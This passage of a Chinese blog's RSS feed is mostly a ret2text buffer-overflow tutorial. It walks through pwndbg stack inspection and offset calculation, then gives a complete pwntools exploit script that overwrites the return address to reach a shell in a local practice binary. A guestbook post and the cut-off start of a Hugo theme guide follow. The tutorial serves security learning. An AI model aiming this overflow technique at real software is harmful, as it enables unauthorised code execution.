&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到buffer[8]距离&lt;code&gt;prev ebp&lt;/code&gt;有16字节的距离，由于我们还需填充&lt;code&gt;prev ebp&lt;/code&gt;,我们还要填充4字节的垃圾数据，一共20字节垃圾数据&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过pwndbg动态调试&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gdb ret2text
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于我们要溢出的地方在函数&lt;code&gt;vulnerable()&lt;/code&gt;,我们直接在那个地方打断点&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b vulnerable
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;现在开始调试该程序&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;r
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一直下一步直到输入(虽说本次只需要一次)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;n
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输入8个A测试一下&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 184; 
			flex-basis: 443px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/n.png&#34; data-size=&#34;1145x620&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/n.png&#34;
			width=&#34;1145&#34;
			height=&#34;620&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/n_huc568db901354378ff555ada67fedb758_589868_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/n_huc568db901354378ff555ada67fedb758_589868_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;AAAAAAAA&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;AAAAAAAA&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输入stack 大小(这个大小随意，最好大一些) 查看栈的情况&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;stack 40
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;pwndbg&amp;gt; stack &lt;span class=&#34;m&#34;&gt;40&lt;/span&gt;
00:0000│ esp 0xffffd070 ◂— 0x1
01:0004│     0xffffd074 —▸ 0x80483e0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_start&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— xor    ebp, ebp
02:0008│ eax 0xffffd078 ◂— &lt;span class=&#34;s1&#34;&gt;&amp;#39;AAAAAAAA&amp;#39;&lt;/span&gt;
03:000c│     0xffffd07c ◂— &lt;span class=&#34;s1&#34;&gt;&amp;#39;AAAA&amp;#39;&lt;/span&gt;
04:0010│     0xffffd080 —▸ 0x8048600 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__libc_csu_init+32&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— dec    dword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ebp - 0xfb7d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
05:0014│     0xffffd084 —▸ 0x804a000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_GLOBAL_OFFSET_TABLE_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; —▸ 0x8049f0c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_DYNAMIC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— 0x1
06:0018│ ebp 0xffffd088 —▸ 0xffffd098 ◂— 0x0
07:001c│     0xffffd08c —▸ 0x80485ae &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;main+93&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— sub    esp, 0xc
08:0020│     0xffffd090 —▸ 0xffffd0b0 ◂— 0x1
09:0024│     0xffffd094 ◂— 0x0
0a:0028│     0xffffd098 ◂— 0x0
0b:002c│     0xffffd09c —▸ 0xf7dd9905 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__libc_start_main+229&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— add    esp, 0x10
0c:0030│     0xffffd0a0 ◂— 0x1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到A们在地址&lt;code&gt;0xffffd078&lt;/code&gt;,而&lt;code&gt;prev ebp&lt;/code&gt;的地址是&lt;code&gt;0xffffd088&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Tip: 0x表示16进制&lt;/p&gt;
&lt;p&gt;为什么计算机中的东西是用二进制表示的，这里显示16进制呢？&lt;/p&gt;
&lt;p&gt;那是因为二进制串实在太长了，不方便查看(0b11111111111111111101000001111000)  = =&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于前面一长串f都是一样的，我们只需要计算 &lt;strong&gt;&lt;code&gt;0x88-0x78+0x4&lt;/code&gt;&lt;/strong&gt; 就可以了(加上0x4是因为要填充 &lt;code&gt;prev ebp&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;再来个Tip: 每种地址都有一定特点&lt;/p&gt;
&lt;p&gt;比如说: 栈里的地址都很大，一边都是0xffff&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以共填充20字节垃圾数据&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;获取&lt;code&gt;get_shell()&lt;/code&gt;地址&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从IDA里找&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;点击左侧函数列表里的函数，然后复制右侧窗口里的那个值&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Tip: IDA是个懒家伙，那个值默认是16进制，但它没有加上前缀0x, &lt;strong&gt;使用这个值的时候自行加上&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 246; 
			flex-basis: 592px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/addr.png&#34; data-size=&#34;1603x649&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/addr.png&#34;
			width=&#34;1603&#34;
			height=&#34;649&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;get_shel1()地址&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;get_shel1()地址&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用PWNTools&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;别忘了python导入模块&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kira㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Sec/PWN/Stack&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ python                 
Python 3.9.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;main, Jan &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 2022, 17:12:18&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GCC 11.2.0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; on linux
Type &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; or &lt;span class=&#34;s2&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; from pwn import *
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;加载该ELF文件信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;寻找&lt;code&gt;get_shell()&lt;/code&gt;函数地址&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get_shell&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，get_shell变量就保存着&lt;code&gt;get_shell()&lt;/code&gt;函数地址了&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;exploit&#34;&gt;Exploit!&lt;/h3&gt;
&lt;p&gt;呼～终于到了攻击的时候&lt;/p&gt;
&lt;p&gt;攻击前，先运行程序试一试&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;./ret2text
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入可以随便写点什么(我这里写一个A)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kira㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Sec/PWN/Stack&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ ./ret2text                       
Have you heard of buffer overflow?
A 
It seems that you know nothing about it ......
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;嘛。。这小程序说我们不会缓冲区溢出。。现在就证明给它看我们会！（&lt;/p&gt;
&lt;p&gt;先建一个攻击脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;vi exp_ret2text.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一件事情嘛= =，当然是导入pwntools模块&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后就是基本操作&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;构造payload(要输入的东西，也就是垃圾数据和我们想要程序返回的地址)&lt;/p&gt;
&lt;p&gt;如果你用IDA取地址(不建议)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x08048522&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果你用pwntools取地址(你可以直接在编写脚本的时候取地址)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get_shell&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后，把恶意数据喂给程序 &lt;del&gt;唔哈哈哈哈;)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;就能尽情享用得到的shell了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;运行攻击脚本&#34;&gt;运行攻击脚本&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;python3 exp_ret2text.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过程展示&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kira㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Sec/PWN/Stack&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ python3 exp_ret2text.py                                                       
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; process &lt;span class=&#34;s1&#34;&gt;&amp;#39;./ret2text&amp;#39;&lt;/span&gt;: pid &lt;span class=&#34;m&#34;&gt;897972&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/kali/Sec/PWN/Stack/ret2text&amp;#39;&lt;/span&gt;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x8048000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Switching to interactive mode
$ ls
exp_ret2text.py  pwndbg  ret2libc1  ret2libc2  ret2text
$ whoami
kira
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;exp&#34;&gt;EXP&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# 运行这个本地程序&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# 接收输出&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# payload = b&amp;#39;A&amp;#39;*20 + p32(0x08048522)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# 不建议使用IDA去获得地址，因为嘛= =还是尽可能用代码操作&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 读取文件的信息&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get_shell&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 搜索&amp;#34;符号&amp;#34;get_shell&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#投喂数据(虽说是恶意数据)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#切换到交互模式&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_43833642/article/details/104175028&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/weixin_43833642/article/details/104175028&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_44932880/article/details/104092620&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/weixin_44932880/article/details/104092620&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/ylcangel/article/details/102625948&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;二进制漏洞挖掘之栈溢出-开启RELRO_ylcangel的专栏-CSDN博客_partial relro&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;To Be Continued .qaq.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>留言板</title>
        <link>https://kira-pgr.github.io/posts/comment/</link>
        <pubDate>Thu, 10 Feb 2022 07:54:34 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/comment/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/comment/cover.jpg" alt="Featured image of post 留言板" /&gt;&lt;h1 id=&#34;嘛--这是一个留言板&#34;&gt;嘛。。。= = 这是一个留言板&lt;/h1&gt;
&lt;p&gt;嘿嘿，小伙伴们可以在下面评论区畅所欲言哦&lt;/p&gt;
&lt;p&gt;大家可以给我留言，求资源，交流技术，在这里交朋友&lt;/p&gt;
&lt;p&gt;甚至可以贴广告&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;咳咳，当然是非盈利性的那种= = 我们是开源主义者XD&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;PS:如果我博客的文章内容有什么技术上的错误的话烦请各位dalao指正哦.qaq.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>Hugo Stack主题简单美化</title>
        <link>https://kira-pgr.github.io/posts/hugo2/</link>
        <pubDate>Wed, 09 Feb 2022 04:35:37 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/hugo2/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/hugo2/cover.jpg" alt="Featured image of post Hugo Stack主题简单美化" /&gt;&lt;h1 id=&#34;hugo-stack-简单美化配置&#34;&gt;Hugo Stack 简单美化/配置&lt;/h1&gt;
&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;本篇文章主要是说说几个我在搭建博客的时候采用的几种美化/配置方式，&lt;/p&gt;
&lt;p&gt;如大家有其他需求的话，可以去康康文末几个&lt;strong&gt;参考链接&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;分类部分加上缩略图&#34;&gt;分类部分加上缩略图&lt;/h2&gt;
&lt;p&gt;在你网站根目录(术语不理解的话看&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/hugo1/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;上一篇文章&lt;/a&gt;)打开终端/cmd/其他命令行工具，&lt;/p&gt;
&lt;p&gt;并输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;hugo new categories/分类名字/_index.md
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意: index前面下划线不能少&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后修改&lt;code&gt;_index.md&lt;/code&gt;成下面这种样子&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;nn&#34;&gt;---&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;分类名&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
